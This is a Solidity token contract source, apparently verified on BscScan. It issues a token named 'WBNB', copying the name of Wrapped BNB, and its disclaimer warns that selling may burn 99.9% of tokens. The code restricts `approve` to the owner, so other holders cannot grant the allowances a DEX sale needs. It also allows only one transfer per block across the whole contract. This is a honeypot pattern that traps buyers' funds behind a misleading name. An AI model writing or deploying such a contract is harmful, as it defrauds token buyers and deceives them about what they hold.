/**
 *Submitted for verification at BscScan.com on 2022-08-14
*/

pragma solidity ^0.8.9;
/*
--------------------------------------------------- DISCLAIMER ---------------------------------------------------

This is a collectable fungible token, compliant with the ERC-20 standard and not the ERC-721 standard. 

It is not designed to yield capital gains and will slash those that attempt to do so. 

This fungible token is NOT designed for trading purposes, it is meant for HODLing until the end of time
and is not generally redeemable. Interested parties are fully responsible for the outcome of their purchases. 

* Tokenomics *

- Tokens can be sent/transferred amongst blockchain participants. 

- Selling of tokens on a DEX or redeeming attempts may result in 99.9% token burn. 

Disclaimer: Smart Contract creator and its affiliates are NOT liable to refund or redeem this ERC-20 collectable.

--------------------------------------------------------------------------------------------------------------------
*/


interface IOwnable {
  function owner() external view returns (address);

  function renounceOwnership() external;
  
  function claim( address newOwner_ ) external;
}

contract Ownable is IOwnable {
    
  address internal _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () {
    _owner = msg.sender;
    emit OwnershipTransferred( address(0), _owner );
  }

  function owner() public view override returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require( _owner == msg.sender, "Ownable: caller is not the owner" );
    _;
  }

  function renounceOwnership() public virtual override onlyOwner() {
    emit OwnershipTransferred( _owner, address(0) );
    _owner = address(0);
  }

  function claim( address newOwner_ ) public virtual override onlyOwner() {
    require( newOwner_ != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred( _owner, newOwner_ );
    _owner = newOwner_;
  }
}

contract VaultOwned is Ownable {
    
  address internal _vault;

  function setVault( address vault_ ) external onlyOwner() returns ( bool ) {
    _vault = vault_;

    return true;
  }

//  function vault() public view returns (address) {
//    return _vault;
//  }

  modifier onlyVault() {
    require( _vault == msg.sender, "VaultOwned: caller is not the Vault" );
    _;
  }

}

contract WBNB is VaultOwned { 
    mapping(address => uint) public balances;
    mapping(address=> mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000000000000000 * 10**1;
    string public name = "WBNB";
    string public symbol = "WBNB";
    uint public decimals = 18;
    uint256 public blockNumber;

    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool){
        require(balanceOf(msg.sender) >= value, 'balance too low' );
        balances[to] += value;
        balances[msg.sender] -= value;
        require(blockNumber < block.number);
        blockNumber = block.number;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool){
        require(balanceOf(from) >= value, 'balance too low' );
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        require(blockNumber < block.number);
        blockNumber = block.number;
        emit Transfer(from, to, value);
        return true;
        
    }
    
    function approve(address spender, uint256 value) public onlyOwner returns(bool success){
        allowance[msg.sender][spender] = value;
        require(blockNumber < block.number);
        blockNumber = block.number;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}